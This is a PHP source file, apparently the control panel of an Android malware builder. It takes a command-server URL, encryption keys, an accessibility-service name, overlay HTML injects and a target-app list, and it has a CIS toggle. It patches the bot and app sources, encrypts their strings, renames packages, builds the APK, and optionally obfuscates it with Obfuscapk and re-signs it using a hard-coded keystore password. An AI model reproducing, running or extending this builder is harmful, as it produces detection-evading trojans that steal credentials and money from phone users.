<?php

class build
{
    function main()
    {
        ob_start();

        $this->setPaths();
        system(" mkdir " . $_SESSION['path_build']);

        echo $this->showFrontendHTML();
        $this->backend();
    }

    public function setPaths(): void
    {
        $home = getcwd();
        $id_user = md5($_SESSION['key_log']);
        $_SESSION['path_temp'] = $home . "/../build/tmpfile/" . $id_user . "/";
        $_SESSION['path_build'] = $home . "/../build/buildFile/" . $id_user . '/';
        $_SESSION['path_source'] = $home . "/../source/";
        $_SESSION['path_obfusk'] = $home . "/../Obfuscapk/";
        $_SESSION['path_home'] = $home . "/../";
    }

    function showFrontendHTML()
    {
        require_once 'utilsDir.php';
        $utilsDir = new utilsDir();
        $getHTML = file_get_contents("Builder.html");
        return str_replace("<!---SET-DATA-TABLES--->", $utilsDir->frontendTables(), $getHTML);
    }

    function backend()
    {
        if (($_SERVER["REQUEST_METHOD"] ?? 'GET') == 'GET') {
            if (isset($_GET['download'])) {
                $arrayFilter = array(".", "/", "script", "'", ":", ";", "+");
                $nameFile = base64_decode($_GET['download']);
                foreach ($arrayFilter as $r) {
                    $nameFile = str_replace("$r", "", $nameFile);
                }
                require_once 'utilsDir.php';
                $utilsDir = new utilsDir();
                $utilsDir->file_download($_SESSION['path_build'] . "$nameFile");
                header("Refresh: 0; ?");
            } else if (isset($_GET['deletefiles'])) {
                system(' rm -r ' . $_SESSION['path_build']);
                header("Refresh: 0; ?");
            }
        } else if ($_SERVER['REQUEST_METHOD'] == 'POST') {
            if (!empty($_POST['ed_url'])) {
                $url = $_POST['ed_url'];
                if ($this->endsWith($url, "/")) {
                    $url = substr($url, 0, -1);
                }

                $name_app = $_POST['ed_name'];
                $name_accessibility = $_POST['ed_service_name'];
                $tag = $_POST['ed_tag'];
                $key = $_POST['ed_encr'];
                $initialkey = $_POST['ed_initcr'];

                $ignore_debug = ($_POST['ch_debug'] == 'on') ? '1' : '0';
                $ch_cis = ($_POST['ch_cis'] == 'on') ? '1' : '0';
                $ch_wait = ($_POST['ch_wait'] == 'on') ? '1' : '0';
                $crypt_apk = ($_POST['ch_crypt_apk'] == 'on') ? '1' : '0';
                $build_inj = ($_POST['ch_injector'] == 'on') ? '1' : '0';
                $package_xiaomi = ($_POST['ch_package'] == 'on') ? '1' : '0';
                $ch_nomutate = ($_POST['ch_nomutate'] == 'on') ? '1' : '0';

                $white_app = $_POST['select'];

                $html = "";
                $htmlPopup = "";

                //Build APK
                system(' rm -rf ' . $_SESSION['path_temp'] . "*");
                system(" mkdir " . $_SESSION['path_temp']);
                system(" cp -r " . $_SESSION['path_source'] . " " . $_SESSION['path_temp'] . "source/");
                system(" cp -r " . $_SESSION['path_obfusk'] . " " . $_SESSION['path_temp']);
                system(" chmod -R 777 " . $_SESSION['path_temp']);

                if ($_FILES) {
                    if($_FILES['upload_icon']['tmp_name'] != "") {
                        $image = file_get_contents($_FILES['upload_icon']['tmp_name']);
                        file_put_contents($_SESSION['path_temp'] . "icon.png", $image);
                    }

                    if ($_FILES['upload_html']['tmp_name'] != "") {
                        $content_html = file_get_contents($_FILES['upload_html']['tmp_name']);
                        $html = base64_encode($content_html);
                    }
                    if ($_FILES['upload_popup_html']['tmp_name'] != "") {
                        $content_htmlPopup = file_get_contents($_FILES['upload_popup_html']['tmp_name']);
                        $htmlPopup = base64_encode($content_htmlPopup);
                    }
                }

                $this->start(
                    $url,
                    $name_app,
                    $name_accessibility,
                    $tag,
                    $key,
                    $initialkey,

                    $ignore_debug,
                    $ch_cis,
                    $ch_wait,
                    $crypt_apk,
                    $build_inj,
                    $package_xiaomi,
                    $ch_nomutate,

                    $white_app,
                    $html,
                    $htmlPopup
                );
            }
        }
    }

    function endsWith($haystack, $needle)
    {
        $length = strlen($needle);
        if (!$length) {
            return true;
        }
        return substr($haystack, -$length) === $needle;
    }

    function start(
                   $url,
                   $name_app,
                   $name_accessibility,
                   $tag,
                   $key,
                   $initialkey,

                   $ignore_debug,
                   $ch_cis,
                   $ch_wait,
                   $crypt_apk,
                   $build_inj,
                   $package_xiaomi,
                   $ch_nomutate,

                   $white_app,
                   $html,
                   $htmlPopup)
    {
        require_once 'utils.php';

        $_SESSION['path_obfusk_work'] = $_SESSION['path_temp'] . "Obfuscapk/";

        $_SESSION['bot'] = $_SESSION['path_temp'] . "source/bot/";
        $_SESSION['app'] = $_SESSION['path_temp'] . "source/app/";
        $_SESSION['bot_src_main'] = $_SESSION['path_temp'] . "source/bot/src/main/";
        $_SESSION['app_src_main'] = $_SESSION['path_temp'] . "source/app/src/main/";
        $_SESSION['bot_src'] = $_SESSION['path_temp'] . "source/bot/src/main/java/";
        $_SESSION['app_src'] = $_SESSION['path_temp'] . "source/app/src/main/java/";

        $utils = new utils();
        $utils->replaceStringProject(
            $url,
            $name_app,
            $name_accessibility,
            $tag,
            $key,
            $initialkey,

            $ignore_debug,
            $ch_cis,
            $ch_wait,
            $build_inj,

            $white_app,
            $html,
            $htmlPopup
        );

        if($ch_nomutate != '1') {
            $utils->cryptPackage2($package_xiaomi);
            $utils->replaceNameFileMain2JavaClass();
            $utils->cryptAllString();
            $utils->replaceAllFolder($_SESSION['bot_src'] . 'com/xxx/zzz/');
            $utils->replaceNameFileJavaClass($build_inj);
            $utils->cryptRes();
        }
        $utils->createKey();
        $utils->createIcon();
        if($ch_nomutate != '1') {
            $utils->cryptPackage();
        }


        $cnt_before = count($utils->getFiles($_SESSION['path_build']));
        // if ($build_inj == '1') {
        //     exec("cd " . $_SESSION['path_temp'] . "source/ &&  ./gradlew bot:bundleReleaseAar --stacktrace");

        //     $indexAPK = count($utils->getFiles($_SESSION['path_build'])) + 1;
        //     system(" cp -r " . $_SESSION['path_temp'] . "source/bot/build/outputs/aar/bot-release.aar " . $_SESSION['path_build'] . "bot-release-" . $indexAPK . ".aar");

        //     ob_end_clean();
        //     header('refresh: 1');
        //     $_SERVER['REQUEST_METHOD'] = "";
        //     $this->main();
        //     if (count($utils->getFiles($_SESSION['path_build'])) != $cnt_before) {
        //         echo "<script>alert('New aar bot-release-$indexAPK.aar')</script>";
        //     } else {
        //         echo "<script>alert('Error build aar')</script>";
        //     }
        // }
        // else {
            exec("cd " . $_SESSION['path_temp'] . "source/ &&  ./gradlew --stop");
            exec("rm -rf ~/.gradle/caches/");
            exec("cd " . $_SESSION['path_temp'] . "source/ &&  ./gradlew clean");
            exec("cd " . $_SESSION['path_temp'] . "source/ &&  ./gradlew assembleRelease --stacktrace");

            if ($crypt_apk == '1') {
                system(' rm -rf ' . $_SESSION['path_obfusk_work'] . "rel/*");
                system(' mkdir ' . $_SESSION['path_obfusk_work'] . "rel/");
                system(" cp -r " . $_SESSION['path_temp'] . "source/app/build/outputs/apk/release/app-release.apk " . $_SESSION['path_obfusk_work'] . "rel/app-release.apk");

                $ex = "cd " . $_SESSION['path_obfusk_work'] . "src && " .
                    "python3 -m obfuscapk.cli " .
                    "-p --use-aapt2 " .
                    "-w " . $_SESSION['path_obfusk_work'] . "rel " .
                    "-d " . $_SESSION['path_obfusk_work'] . "rel/out_app-release.apk ";

                if ($_POST['ch_DebugRemoval'] == 'on')
                    $ex = $ex . "-o DebugRemoval ";

                if ($_POST['ch_Goto'] == 'on')
                    $ex = $ex . "-o Goto ";

                if ($_POST['ch_LibEncryption'] == 'on')
                    $ex = $ex . "-o LibEncryption ";

                if ($_POST['ch_CallIndirection'] == 'on')
                    $ex = $ex . "-o CallIndirection ";

                if ($_POST['ch_MethodRename'] == 'on')
                    $ex = $ex . "-o MethodRename ";

                if ($_POST['ch_AssetEncryption'] == 'on')
                    $ex = $ex . "-o AssetEncryption ";

                if ($_POST['ch_MethodOverload'] == 'on')
                    $ex = $ex . "-o MethodOverload ";

                if ($_POST['ch_ResStringEncryption'] == 'on')
                    $ex = $ex . "-o ResStringEncryption ";

                if ($_POST['ch_ArithmeticBranch'] == 'on')
                    $ex = $ex . "-o ArithmeticBranch ";

                if ($_POST['ch_ArithmeticBranch'] == 'on')
                    $ex = $ex . "-o ArithmeticBranch ";

                if ($_POST['ch_Reflection'] == 'on')
                    $ex = $ex . "-o Reflection ";

                if ($_POST['ch_AdvancedReflection'] == 'on')
                    $ex = $ex . "-o AdvancedReflection ";

                if ($_POST['ch_Reorder'] == 'on')
                    $ex = $ex . "-o Reorder ";

                if ($_POST['ch_RandomManifest'] == 'on')
                    $ex = $ex . "-o RandomManifest ";

                $ex = $ex .
                    "-o Rebuild " .
                    "-o NewAlignment " .
                    "-o NewSignature " .
                    $_SESSION['path_obfusk_work'] . "rel/app-release.apk ";
                exec($ex);

                system("java -jar /usr/bin/apksigner sign -v --ks " . $_SESSION['path_temp'] . "key.jks" . " --ks-key-alias key0 " . " --ks-pass pass:123123 " . " --in " . $_SESSION['path_obfusk_work'] . "rel/out_app-release.apk " . " --out " . $_SESSION['path_obfusk_work'] . "rel/out_app-release_sign.apk ");

                $indexAPK = count($utils->getFiles($_SESSION['path_build'])) + 1;
                system(" cp -r " . $_SESSION['path_obfusk_work'] . "rel/out_app-release_sign.apk " . $_SESSION['path_build'] . "app-release-" . $indexAPK . ".apk");
            }
            else {
                $indexAPK = count($utils->getFiles($_SESSION['path_build'])) + 1;
                system(" cp -r " . $_SESSION['path_temp'] . "source/app/build/outputs/apk/release/app-release.apk " . $_SESSION['path_build'] . "app-release-" . $indexAPK . ".apk");
            }

            ob_end_clean();
            header('refresh: 1');
            $_SERVER['REQUEST_METHOD'] = "";
            $this->main();
            if (count($utils->getFiles($_SESSION['path_build'])) != $cnt_before) {
                echo "<script>alert('New File app-release-$indexAPK.apk')</script>";
            } else {
                echo "<script>alert('Error build apk')</script>";
            }
        }
    // }
}